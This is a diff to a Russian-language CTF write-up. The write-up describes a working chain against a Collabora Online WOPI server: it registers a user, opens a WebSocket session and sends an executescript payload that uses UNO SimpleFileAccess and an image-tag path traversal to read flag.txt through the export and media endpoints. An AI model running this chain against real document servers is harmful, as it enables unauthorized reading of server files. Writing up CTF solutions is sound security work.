@@ -15,20 +15,13 @@
 ## Итог
 Флаг получен с главной страницы инстанса (формат `ctfcup{...}`); инстанс — эфемерный URL, изменяется между запусками (брать из задания/трафика).
 
-## Рабочая цепочка (PoC: `sessions/conv-86/docus_poc_run.py`)
+## Рабочая цепочка (PoC: `toolbox/docus/docus_poc_run.py`)
 1. Регистрация нового пользователя `ctf<hex>@corp` + логин (form-urlencoded).
 2. Создание собственного документа `poc.txt` → id `d<N>`.
 3. **Обязательный** `PUT /wopi/files/d<N>/contents` с blob (без него `savetostorage` даёт `kind=savefailed`).
 4. WebSocket `GET /cool/ws?WOPISrc=..&access_token=..&access_token_ttl=0&no_auth_header=&permission=edit&compat=`; команды:
-   - `coolclient 0.1 <ts> 0`
-   - `load url=<quote(wopi_src)> lang=en-US timezone=UTC clientvisiblearea=0;0;15000;15000`
-   - ждать `status:` и `loaded:`
-   - пауза ~5 с
-5. `executescript 1 <JS>`:
-   - `uno.componentContext.getServiceManager().createInstanceWithContext('com.sun.star.ucb.SimpleFileAccess', ctx)`
-   - `sfa.createFolder('file:///tmp/<TAG>.txt')` (игнор. ошибку)
-   - `doc.getText().setString('<image src="file:///tmp/<TAG>.txt/' + '../'.repeat(10) + 'flag.txt"/>')`
-   - вернуть строку
+   `coolclient 0.1 <ts> 0` → `load url=<quote(wopi_src)> lang=en-US timezone=UTC clientvisiblearea=0;0;15000;15000` → ждать `status:`/`loaded:` (пауза ~5с).
+5. `executescript 1 <JS>`: `uno.componentContext.getServiceManager().createInstanceWithContext('com.sun.star.ucb.SimpleFileAccess', ctx)`; `sfa.createFolder('file:///tmp/<TAG>.txt')` (игнор. ошибку); `doc.getText().setString('<image src="file:///tmp/<TAG>.txt/' + '../'.repeat(10) + 'flag.txt"/>')`.
 6. `downloadas name=<TAG>.txt id=export format=txt options=` → ждать `downloadas:` (в моей версии: 4 попытки по 120 с, первую из них дала ответ id=...).
 7. `GET /cool/<enc_wopi_src>/download/<download_id>?WOPISrc=<enc>&compat=/ws` → в теле `<image src=".../cool/media?WOPISrc=..&ServerId=..&ViewId=..&Tag=<TAG>"/>`.
 8. `GET /cool/media?WOPISrc=..&ServerId=..&ViewId=..&Tag=<TAG>` (без `compat`) → тело = флаг (47 байт).
